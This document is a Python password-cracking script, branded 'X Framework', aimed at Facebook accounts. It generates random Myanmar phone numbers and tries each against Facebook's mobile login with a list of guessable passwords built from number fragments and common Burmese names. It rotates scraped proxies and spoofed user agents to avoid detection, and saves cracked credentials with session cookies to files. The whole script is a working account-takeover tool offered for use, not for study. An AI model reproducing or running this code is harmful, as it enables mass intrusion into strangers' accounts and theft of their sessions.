import os,requests,time,random,sys,string,json,uuid
from concurrent.futures import ThreadPoolExecutor as tred
import base64
from bs4 import BeautifulSoup as bs
RESET = "\033[0m"
BOLD	 = "\033[1m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
ugen=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print(f'{RED}Proxy Download Fail')
prox=open('.prox.txt','r').read().splitlines()

for xd in range(10000):
        aa='Mozilla/5.0 (Linux; Android'
        ver = random.choice(['1','2','3','4','5','6','7','8','9','10','11','12'])
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f'Readmi Note;{ver}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uag=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uag)
oks = []
cps = []
loop = 0
color = [RED,GREEN,YELLOW,BLUE,MAGENTA,CYAN]
rand = random.choice(color)
update = requests.get("https://raw.githubusercontent.com/zaypaihtet/x_famework/main/src/version").text
session = requests.Session()
def logo():
    os.system("figlet X Framework | lolcat")
    print(f"""{BOLD}{rand}
          {GREEN}Author : {CYAN}X-Coder
          {GREEN}Version :{CYAN}{update}
          {BLUE}Contact : {CYAN}https://t.me/x_c0d3r
          """)

def line():
    print(f"{random.choice(color)}=="*20+f"{RESET}")
def clear():
    os.system('clear')

def number():
        user=[]
        clear();logo()
        print('\033[95;1m [+]\033[91;1m Example - \033[92;1m0942 , \033[92;1m0978 , \033[92;1m0995 , \033[92;1m0998')
        code = input('\33[1;37m [+] Enter Code :\33[1;37m ')
        try:
                limit = int(input(' [+] Enter limit:\33[1;37m '))
        except ValueError:
                limit = 5000
        for nmbr in range(limit):
                nmp = ''.join(random.choice(string.digits) for _ in range(7))
                user.append(nmp)
        with tred(max_workers=30) as num:
                clear();logo()
                tl = str(len(user))
                print('\33[1;37m [+] Total accounts : \033[1;32m'+tl)
                print('\33[1;37m [+] Selected code  :\033[1;32m '+code)
                print('\33[1;37m [+] Process has been started\033[1;97m')
                line()
                for psx in user:
                    ids = code+psx
                    passlist = [psx,ids[5:],ids,ids[1:],ids[2:],ids[3:],'Myanmar','kyawkyaw','KyawKyaw','nyinyi','myanmar','myanmar123','moemoe','Aung123','ayeaye','nyinyi123','Myanmar123','thuthu','kyaw123','soe123','zawzaw','zaw123','thuzar','thuzar123','kyawgyi','linlin','chitchit','waiwai','Kyaw12345','Wai12345','Min12345','Soe12345','Nyi12345','Zaw12345','Aung12345','aungaung']
                    nip=random.choice(prox)
                            # passlist = [psx,ids[5:],ids,ids[1:],ids[2:],ids[3:]]
                    num.submit(rd2,ids,passlist,nip)
        print('\033[1;37m')
        line()
        print(' [+] The process has completed')
        print(' [+] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
        line()

def rd2(ids,passlist,nip):
                try:
                        global loop,oks,cps
                        sys.stdout.write('\r\r\033[1;37m [Cracking] - %s \033[1;32mOK-%s \033[1;33mCP-%s\033[1;97m'%(loop,len(oks),len(cps)));sys.stdout.flush()
                        for pas in passlist:
                                proxs= {'http': 'socks5://'+nip}
                                session = requests.Session()
                                ug = random.choice(ugen)
                                head ={'authority': 'x.alpha.facebook.com',
                                       'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                                       'method':'POST',
                                       'accept-language': 'en-US,en;q=0.9',
                                       'cache-control': 'max-age=0',
                                       'content-type': 'application/x-www-form-urlencoded',
                                       'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                                       'sec-ch-ua-mobile': '?0',
                                       'sec-ch-ua-platform': '"Linux"',
                                       'sec-fetch-dest': 'document',
                                       'sec-fetch-mode': 'navigate',
                                       'sec-fetch-site': 'same-origin',
                                       'sec-fetch-user': '?1',
                                       'upgrade-insecure-requests': '1',
                                       'user-agent': ug,
                                }
                                with session.get("https://x.alpha.facebook.com/") as response_body:
                                        inspect=bs(response_body.text,'html.parser')
                                        lsd_key=inspect.find('input',{'name':'lsd'})['value']
                                        jazoest_key=inspect.find('input',{'name':'jazoest'})['value']
                                        m_ts_key=inspect.find('input',{'name':'m_ts'})['value']
                                        li_key=inspect.find('input',{'name':'li'})['value']
                                        try_number_key=inspect.find('input',{'name':'try_number'})['value']
                                        unrecognized_tries_key=inspect.find('input',{'name':'unrecognized_tries'})['value']
                                        bi_xrwh_key=inspect.find('input',{'name':'bi_xrwh'})['value']
                                data={'lsd':lsd_key,'jazoest':jazoest_key,
                                      'm_ts':m_ts_key,'li':li_key,
                                      'try_number':try_number_key,
                                      'unrecognized_tries':unrecognized_tries_key,
                                      'bi_xrwh':bi_xrwh_key,'email':ids,
                                      'pass':pas,'login':"submit"}
                                response_body2=session.post("https://x.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=data,allow_redirects=True,headers=head,proxies=proxs)
                                cookie=str(session.cookies.get_dict())
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                open("o.html",'wb').write(response_body2.content)
                                if "c_user" in cookie:
                                        print('\r\r\033[1;32m Cracked 》OK %s | %s'%(ids,pas))
                                        print(f"{RESET}{BOLD} [Proxy] [{nip}] {RESET}")
                                        print(" Cookie :" ,kuki)
                                        open('/sdcard/num_ok.txt', 'a').write(ids+'|'+pas+ '|' + kuki  +'\n')
                                        print("Useragent :" ,ug)

                                        line()
                                        oks.append(ids)
                                elif 'checkpoint' in cookie:
                                        print('\r\033[1;33m Cracked 》CP '+ids+' | '+pas)
                                        print(f"{RESET}{BOLD} [Proxy] [{nip}] {RESET}")
                                        open('/sdcard/num_cp.txt', 'a').write(ids+'|'+pas+ '|' + kuki  +'\n')
                                        cps.append(ids)
                                        line()

                                else:
                                        continue
                        loop=loop+1

                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
number()
